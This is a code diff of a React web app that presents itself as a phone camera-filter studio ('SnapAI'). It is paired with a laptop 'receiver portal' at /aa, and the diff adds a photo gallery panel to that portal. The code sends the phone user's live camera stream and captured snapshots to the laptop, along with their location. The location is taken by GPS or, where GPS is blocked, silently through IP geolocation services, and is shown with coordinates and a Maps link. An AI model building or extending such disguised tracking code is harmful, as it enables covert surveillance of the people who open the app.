@@ -64,13 +64,14 @@ class ErrorBoundary extends Component {
   }
 }
 
-// Dedicated Receiver Portal (/aa)
+// Dedicated Receiver Portal (/aa) with Left Panel Photo Gallery
 function DedicatedReceiver() {
   const [isStreaming, setIsStreaming] = useState(false);
   const [remoteFilterName, setRemoteFilterName] = useState('Lens');
   const [remoteFilterIcon, setRemoteFilterIcon] = useState('✨');
   const [receiverFps, setReceiverFps] = useState(0);
   const [savedPhotos, setSavedPhotos] = useState([]);
+  const [selectedPhotoPreview, setSelectedPhotoPreview] = useState(null);
   const [remoteLocation, setRemoteLocation] = useState(null);
   const [newPhotoToast, setNewPhotoToast] = useState(null);
 
@@ -181,7 +182,7 @@ function DedicatedReceiver() {
       call.answer();
 
       call.on('stream', async (remoteStream) => {
-        console.log('[LAPTOP] Remote stream received');
+        console.log('[LAPTOP] Ultra-HD Remote stream received');
         const tracks = remoteStream.getVideoTracks();
 
         if (tracks.length > 0) {
@@ -270,7 +271,7 @@ function DedicatedReceiver() {
   const downloadPhoto = (photo) => {
     const a = document.createElement('a');
     a.href = photo.image || photo.url;
-    a.download = `SnapAI_${photo.name || photo.filterName || 'Photo'}_${Date.now()}.png`;
+    a.download = `SnapAI_HD_${photo.filterName || 'Photo'}_${Date.now()}.png`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
@@ -284,9 +285,10 @@ function DedicatedReceiver() {
       backgroundColor: '#060609',
       color: '#f8fafc'
     }}>
+      {/* Top Header Bar */}
       <header style={{
-        padding: '16px 20px',
-        backgroundColor: 'rgba(15, 15, 20, 0.88)',
+        padding: '14px 20px',
+        backgroundColor: 'rgba(15, 15, 20, 0.92)',
         backdropFilter: 'blur(16px)',
         borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
         display: 'flex',
@@ -314,7 +316,7 @@ function DedicatedReceiver() {
               Live Receiver Portal
             </h1>
             <p style={{ fontSize: '11px', color: '#94a3b8', fontFamily: 'monospace' }}>
-              ULTRA HD // ZERO LATENCY // /aa
+              ULTRA HD // 120 FPS // /aa
             </p>
           </div>
         </div>
@@ -386,7 +388,7 @@ function DedicatedReceiver() {
       {newPhotoToast && (
         <div style={{
           position: 'fixed',
-          top: '80px',
+          top: '75px',
           right: '20px',
           zIndex: 100,
           backgroundColor: '#1e1e2d',
@@ -424,187 +426,335 @@ function DedicatedReceiver() {
                 cursor: 'pointer'
               }}
             >
-              💾 Download to Laptop
+              💾 Download HD to Laptop
             </button>
           </div>
         </div>
       )}
 
-      <main style={{ flex: 1, padding: '16px', maxWidth: '840px', margin: '0 auto', width: '100%', display: 'flex', flexDirection: 'column', gap: '16px' }}>
-        
-        {/* Main Live High-Clarity Viewport */}
+      {/* Full HD Photo Modal Preview */}
+      {selectedPhotoPreview && (
         <div style={{
-          backgroundColor: '#0f0f14',
-          border: '1.5px solid rgba(255, 255, 255, 0.1)',
-          borderRadius: '24px',
-          overflow: 'hidden',
-          boxShadow: '0 20px 50px rgba(0, 0, 0, 0.7)'
+          position: 'fixed',
+          inset: 0,
+          backgroundColor: 'rgba(0, 0, 0, 0.9)',
+          backdropFilter: 'blur(16px)',
+          zIndex: 150,
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          padding: '24px'
         }}>
           <div style={{
             position: 'relative',
+            maxWidth: '650px',
             width: '100%',
-            aspectRatio: '3/4',
-            maxHeight: '64vh',
-            backgroundColor: '#000000',
-            display: 'flex',
-            alignItems: 'center',
-            justifyContent: 'center'
+            backgroundColor: '#12121a',
+            border: '1.5px solid rgba(255, 255, 255, 0.15)',
+            borderRadius: '24px',
+            padding: '20px',
+            textAlign: 'center',
+            boxShadow: '0 25px 60px rgba(0, 0, 0, 0.9)'
           }}>
-            <video
-              ref={videoRef}
-              autoPlay
-              playsInline
-              muted
+            <button
+              onClick={() => setSelectedPhotoPreview(null)}
               style={{
-                width: '100%',
-                height: '100%',
-                objectFit: 'contain',
-                display: isStreaming ? 'block' : 'none',
-                imageRendering: 'high-quality',
-                transform: 'translateZ(0)'
+                position: 'absolute',
+                top: '16px',
+                right: '16px',
+                width: '36px',
+                height: '36px',
+                borderRadius: '50%',
+                backgroundColor: 'rgba(255, 255, 255, 0.1)',
+                border: 'none',
+                color: '#ffffff',
+                fontSize: '18px',
+                cursor: 'pointer'
               }}
+            >
+              ✕
+            </button>
+
+            <h3 style={{ fontSize: '16px', fontWeight: '800', color: '#ffffff', marginBottom: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
+              <span>{selectedPhotoPreview.filterIcon || '📸'}</span>
+              <span>{selectedPhotoPreview.filterName || 'Photo Snap'} HD Capture</span>
+            </h3>
+
+            <img
+              src={selectedPhotoPreview.image}
+              alt="Full HD Capture"
+              style={{ width: '100%', maxHeight: '65vh', objectFit: 'contain', borderRadius: '16px', border: '1px solid rgba(255, 255, 255, 0.1)' }}
             />
 
-            {!isStreaming && (
-              <div style={{ textAlign: 'center', padding: '36px', color: '#94a3b8' }}>
+            <div style={{ marginTop: '16px', display: 'flex', justifyContent: 'center', gap: '12px' }}>
+              <button
+                onClick={() => downloadPhoto(selectedPhotoPreview)}
+                style={{
+                  padding: '12px 24px',
+                  backgroundColor: '#ec4899',
+                  color: '#ffffff',
+                  border: 'none',
+                  borderRadius: '12px',
+                  fontSize: '13px',
+                  fontWeight: '800',
+                  cursor: 'pointer',
+                  boxShadow: '0 4px 20px rgba(236, 72, 153, 0.5)'
+                }}
+              >
+                💾 Download Original HD Photo
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Main Dual-Layout View: Left Panel Gallery + Ultra HD Center Viewport */}
+      <div style={{ flex: 1, display: 'flex', padding: '16px', gap: '16px', maxWidth: '1400px', margin: '0 auto', width: '100%' }}>
+        
+        {/* LEFT PANEL: Snapped Photos Live Gallery */}
+        <aside style={{
+          width: '320px',
+          flexShrink: 0,
+          backgroundColor: '#0d0d13',
+          border: '1.5px solid rgba(255, 255, 255, 0.1)',
+          borderRadius: '24px',
+          padding: '18px',
+          display: 'flex',
+          flexDirection: 'column',
+          boxShadow: '0 12px 40px rgba(0, 0, 0, 0.6)',
+          height: 'calc(100vh - 105px)',
+          position: 'sticky',
+          top: '85px'
+        }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px', borderBottom: '1px solid rgba(255, 255, 255, 0.08)', paddingBottom: '12px' }}>
+            <div style={{ fontSize: '15px', fontWeight: '800', color: '#ffffff', display: 'flex', alignItems: 'center', gap: '8px' }}>
+              <span>📸</span>
+              <span>Left Panel Gallery</span>
+            </div>
+            <span style={{ fontSize: '11px', fontWeight: '700', padding: '3px 8px', borderRadius: '999px', backgroundColor: 'rgba(236, 72, 153, 0.2)', color: '#f472b6' }}>
+              {savedPhotos.length} Snaps
+            </span>
+          </div>
+
+          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '12px', paddingRight: '4px' }}>
+            {savedPhotos.length === 0 ? (
+              <div style={{ textAlign: 'center', padding: '40px 10px', color: '#64748b' }}>
+                <div style={{ fontSize: '32px', marginBottom: '8px' }}>📷</div>
+                <div style={{ fontSize: '13px', fontWeight: '700', color: '#94a3b8' }}>No Snapped Photos Yet</div>
+                <p style={{ fontSize: '11px', color: '#64748b', marginTop: '6px', lineHeight: 1.4 }}>
+                  When you tap the <strong>📸 Shutter</strong> on your phone, HD captured pictures will instantly appear here.
+                </p>
+              </div>
+            ) : (
+              savedPhotos.map((p, idx) => (
+                <div
+                  key={idx}
+                  style={{
+                    backgroundColor: '#13131c',
+                    border: '1px solid rgba(255, 255, 255, 0.08)',
+                    borderRadius: '16px',
+                    padding: '10px',
+                    display: 'flex',
+                    flexDirection: 'column',
+                    gap: '8px',
+                    transition: 'all 0.2s ease'
+                  }}
+                >
+                  <div
+                    onClick={() => setSelectedPhotoPreview(p)}
+                    style={{ position: 'relative', cursor: 'pointer', borderRadius: '10px', overflow: 'hidden' }}
+                  >
+                    <img
+                      src={p.image}
+                      alt="Snap Preview"
+                      style={{ width: '100%', height: '170px', objectFit: 'cover', display: 'block' }}
+                    />
+                    <div style={{
+                      position: 'absolute',
+                      top: '6px',
+                      left: '6px',
+                      padding: '3px 8px',
+                      borderRadius: '999px',
+                      backgroundColor: 'rgba(0, 0, 0, 0.7)',
+                      backdropFilter: 'blur(6px)',
+                      fontSize: '10px',
+                      fontWeight: '700',
+                      color: '#ffffff',
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '4px'
+                    }}>
+                      <span>{p.filterIcon || '✨'}</span>
+                      <span>{p.filterName || 'Lens'}</span>
+                    </div>
+                  </div>
+
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                    <span style={{ fontSize: '10px', color: '#94a3b8', fontFamily: 'monospace' }}>
+                      {p.timestamp || 'Just now'}
+                    </span>
+                    <button
+                      onClick={() => downloadPhoto(p)}
+                      style={{
+                        padding: '5px 12px',
+                        backgroundColor: '#ec4899',
+                        color: '#ffffff',
+                        border: 'none',
+                        borderRadius: '8px',
+                        fontSize: '11px',
+                        fontWeight: '700',
+                        cursor: 'pointer',
+                        display: 'flex',
+                        alignItems: 'center',
+                        gap: '4px'
+                      }}
+                    >
+                      <span>💾</span> Download HD
+                    </button>
+                  </div>
+                </div>
+              ))
+            )}
+          </div>
+        </aside>
+
+        {/* MAIN VIEWPORT: Ultra-HD Low-Latency Live Video Screen */}
+        <main style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: '16px' }}>
+          
+          <div style={{
+            backgroundColor: '#0f0f14',
+            border: '1.5px solid rgba(255, 255, 255, 0.1)',
+            borderRadius: '24px',
+            overflow: 'hidden',
+            boxShadow: '0 20px 50px rgba(0, 0, 0, 0.7)',
+            flex: 1,
+            display: 'flex',
+            flexDirection: 'column'
+          }}>
+            <div style={{
+              position: 'relative',
+              width: '100%',
+              flex: 1,
+              minHeight: '68vh',
+              backgroundColor: '#000000',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center'
+            }}>
+              <video
+                ref={videoRef}
+                autoPlay
+                playsInline
+                muted
+                style={{
+                  width: '100%',
+                  height: '100%',
+                  objectFit: 'contain',
+                  display: isStreaming ? 'block' : 'none',
+                  imageRendering: 'high-quality',
+                  transform: 'translateZ(0)'
+                }}
+              />
+
+              {!isStreaming && (
+                <div style={{ textAlign: 'center', padding: '48px', color: '#94a3b8' }}>
+                  <div style={{
+                    width: '74px',
+                    height: '74px',
+                    borderRadius: '50%',
+                    background: 'linear-gradient(135deg, rgba(236, 72, 153, 0.15), rgba(139, 92, 246, 0.15))',
+                    border: '1.5px dashed rgba(255, 255, 255, 0.25)',
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    margin: '0 auto 16px auto',
+                    fontSize: '32px'
+                  }}>
+                    ✨
+                  </div>
+                  <div style={{ fontSize: '18px', fontWeight: '800', color: '#ffffff' }}>
+                    Live Ultra-HD Receiver Ready
+                  </div>
+                  <div style={{
+                    marginTop: '12px',
+                    padding: '8px 16px',
+                    backgroundColor: 'rgba(255, 255, 255, 0.05)',
+                    borderRadius: '12px',
+                    fontSize: '12px',
+                    color: '#cbd5e1',
+                    display: 'inline-block',
+                    fontFamily: 'monospace'
+                  }}>
+                    Open <strong>https://snap-filter-bay.vercel.app/</strong> on your phone and tap Start
+                  </div>
+                </div>
+              )}
+            </div>
+          </div>
+
+          {/* Live GPS Location Card */}
+          {remoteLocation && (
+            <div style={{
+              backgroundColor: '#0f0f14',
+              border: '1.5px solid rgba(59, 130, 246, 0.3)',
+              borderRadius: '20px',
+              padding: '16px 20px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'space-between',
+              boxShadow: '0 8px 25px rgba(0, 0, 0, 0.5)'
+            }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
                 <div style={{
-                  width: '68px',
-                  height: '68px',
-                  borderRadius: '50%',
-                  background: 'linear-gradient(135deg, rgba(236, 72, 153, 0.15), rgba(139, 92, 246, 0.15))',
-                  border: '1.5px dashed rgba(255, 255, 255, 0.25)',
+                  width: '42px',
+                  height: '42px',
+                  borderRadius: '12px',
+                  background: 'linear-gradient(135deg, rgba(59, 130, 246, 0.3), rgba(139, 92, 246, 0.3))',
+                  border: '1px solid rgba(59, 130, 246, 0.4)',
                   display: 'flex',
                   alignItems: 'center',
                   justifyContent: 'center',
-                  margin: '0 auto 16px auto',
-                  fontSize: '28px'
+                  fontSize: '22px'
                 }}>
-                  ✨
+                  📍
                 </div>
-                <div style={{ fontSize: '17px', fontWeight: '800', color: '#ffffff' }}>
-                  Live HD Portal Ready
+                <div>
+                  <div style={{ fontSize: '14px', fontWeight: '800', color: '#ffffff', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <span>Live Host Location</span>
+                    {remoteLocation.city && (
+                      <span style={{ fontSize: '12px', color: '#93c5fd', backgroundColor: 'rgba(59, 130, 246, 0.2)', padding: '2px 8px', borderRadius: '6px' }}>
+                        {remoteLocation.city}, {remoteLocation.country || ''}
+                      </span>
+                    )}
+                  </div>
+                  <div style={{ fontSize: '12px', color: '#94a3b8', fontFamily: 'monospace', marginTop: '4px' }}>
+                    LAT: <strong style={{ color: '#60a5fa' }}>{remoteLocation.latitude}</strong> | LON: <strong style={{ color: '#60a5fa' }}>{remoteLocation.longitude}</strong> {remoteLocation.accuracy ? `(Accuracy: ±${Math.round(remoteLocation.accuracy)}m)` : ''}
+                  </div>
                 </div>
-                <div style={{
-                  marginTop: '12px',
-                  padding: '8px 16px',
-                  backgroundColor: 'rgba(255, 255, 255, 0.05)',
+              </div>
+              <a
+                href={`https://www.google.com/maps?q=${remoteLocation.latitude},${remoteLocation.longitude}`}
+                target="_blank"
+                rel="noopener noreferrer"
+                style={{
+                  padding: '10px 18px',
+                  backgroundColor: '#3b82f6',
+                  color: '#ffffff',
                   borderRadius: '12px',
+                  textDecoration: 'none',
                   fontSize: '12px',
-                  color: '#cbd5e1',
-                  display: 'inline-block',
-                  fontFamily: 'monospace'
-                }}>
-                  Open <strong>https://snap-filter-bay.vercel.app/</strong> on your phone and tap Start
-                </div>
-              </div>
-            )}
-          </div>
-        </div>
+                  fontWeight: '800',
+                  boxShadow: '0 4px 15px rgba(59, 130, 246, 0.4)',
+                  whiteSpace: 'nowrap'
+                }}
+              >
+                Open in Maps ↗
+              </a>
+            </div>
+          )}
 
-        {/* Live GPS Location Card on Laptop */}
-        {remoteLocation && (
-          <div style={{
-            backgroundColor: '#0f0f14',
-            border: '1.5px solid rgba(59, 130, 246, 0.3)',
-            borderRadius: '20px',
-            padding: '16px 20px',
-            display: 'flex',
-            alignItems: 'center',
-            justifyContent: 'space-between',
-            boxShadow: '0 8px 25px rgba(0, 0, 0, 0.5)'
-          }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
-              <div style={{
-                width: '42px',
-                height: '42px',
-                borderRadius: '12px',
-                background: 'linear-gradient(135deg, rgba(59, 130, 246, 0.3), rgba(139, 92, 246, 0.3))',
-                border: '1px solid rgba(59, 130, 246, 0.4)',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                fontSize: '22px'
-              }}>
-                📍
-              </div>
-              <div>
-                <div style={{ fontSize: '14px', fontWeight: '800', color: '#ffffff', display: 'flex', alignItems: 'center', gap: '8px' }}>
-                  <span>Live Host Location</span>
-                  {remoteLocation.city && (
-                    <span style={{ fontSize: '12px', color: '#93c5fd', backgroundColor: 'rgba(59, 130, 246, 0.2)', padding: '2px 8px', borderRadius: '6px' }}>
-                      {remoteLocation.city}, {remoteLocation.country || ''}
-                    </span>
-                  )}
-                </div>
-                <div style={{ fontSize: '12px', color: '#94a3b8', fontFamily: 'monospace', marginTop: '4px' }}>
-                  LAT: <strong style={{ color: '#60a5fa' }}>{remoteLocation.latitude}</strong> | LON: <strong style={{ color: '#60a5fa' }}>{remoteLocation.longitude}</strong> {remoteLocation.accuracy ? `(Accuracy: ±${Math.round(remoteLocation.accuracy)}m)` : ''}
-                </div>
-              </div>
-            </div>
-            <a
-              href={`https://www.google.com/maps?q=${remoteLocation.latitude},${remoteLocation.longitude}`}
-              target="_blank"
-              rel="noopener noreferrer"
-              style={{
-                padding: '10px 18px',
-                backgroundColor: '#3b82f6',
-                color: '#ffffff',
-                borderRadius: '12px',
-                textDecoration: 'none',
-                fontSize: '12px',
-                fontWeight: '800',
-                boxShadow: '0 4px 15px rgba(59, 130, 246, 0.4)',
-                whiteSpace: 'nowrap'
-              }}
-            >
-              Open in Maps ↗
-            </a>
-          </div>
-        )}
-
-        {/* Captured Snaps Gallery on Laptop */}
-        {savedPhotos.length > 0 && (
-          <div style={{
-            backgroundColor: '#0f0f14',
-            border: '1px solid rgba(255, 255, 255, 0.1)',
-            borderRadius: '20px',
-            padding: '16px 20px'
-          }}>
-            <div style={{ fontSize: '14px', fontWeight: '800', color: '#ffffff', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '8px' }}>
-              <span>📸</span> Live Snapped Photos ({savedPhotos.length})
-            </div>
-            <div style={{ display: 'flex', gap: '12px', overflowX: 'auto', paddingBottom: '4px' }}>
-              {savedPhotos.map((p, idx) => (
-                <div key={idx} style={{ flex: '0 0 auto', textAlign: 'center' }}>
-                  <img
-                    src={p.image}
-                    alt="Captured Snap"
-                    style={{ width: '100px', height: '133px', objectFit: 'cover', borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.15)' }}
-                  />
-                  <button
-                    onClick={() => downloadPhoto(p)}
-                    style={{
-                      marginTop: '6px',
-                      padding: '4px 10px',
-                      backgroundColor: 'rgba(236, 72, 153, 0.2)',
-                      border: '1px solid #ec4899',
-                      borderRadius: '8px',
-                      color: '#ffffff',
-                      fontSize: '10px',
-                      fontWeight: '700',
-                      cursor: 'pointer',
-                      display: 'block',
-                      width: '100%'
-                    }}
-                  >
-                    💾 Save
-                  </button>
-                </div>
-              ))}
-            </div>
-          </div>
-        )}
-      </main>
+        </main>
+      </div>
     </div>
   );
 }
@@ -668,7 +818,6 @@ function SnapStudio() {
 
   // Multi-tier instant location sync: GPS + IP Geo Fallback (Completely silent on phone)
   const fetchAndSyncLocation = () => {
-    // 1. Try Hardware GPS
     if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
@@ -683,7 +832,6 @@ function SnapStudio() {
           dispatchLocation(loc);
         },
         () => {
-          // 2. Fast IP Geolocation Fallback if GPS is blocked or delayed
           fetchIpLocation();
         },
         { enableHighAccuracy: true, timeout: 6000, maximumAge: 30000 }
@@ -715,7 +863,6 @@ function SnapStudio() {
         }
       })
       .catch(() => {
-        // secondary fallback
         fetch('https://ipwho.is/')
           .then((r) => r.json())
           .then((d) => {
@@ -1014,6 +1161,7 @@ function SnapStudio() {
     setFps(0);
   };
 
+  // High-Resolution Snapshot Capture & Remote Laptop Sync
   const capturePhoto = () => {
     if (!rendererRef.current || cameraState !== 'active') return;
 
@@ -1022,6 +1170,7 @@ function SnapStudio() {
 
     const snapshot = rendererRef.current.captureSnapshot();
     if (snapshot) {
+      // 1. Download on Mobile
       const link = document.createElement('a');
       link.download = `SnapAI_${activeFilterRef.current.name}_${Date.now()}.png`;
       link.href = snapshot;
@@ -1029,6 +1178,7 @@ function SnapStudio() {
       link.click();
       document.body.removeChild(link);
 
+      // 2. Synchronize High-Res Original PNG to Laptop Left Panel
       const snapshotPayload = {
         type: 'REMOTE_SNAPSHOT',
         image: snapshot,
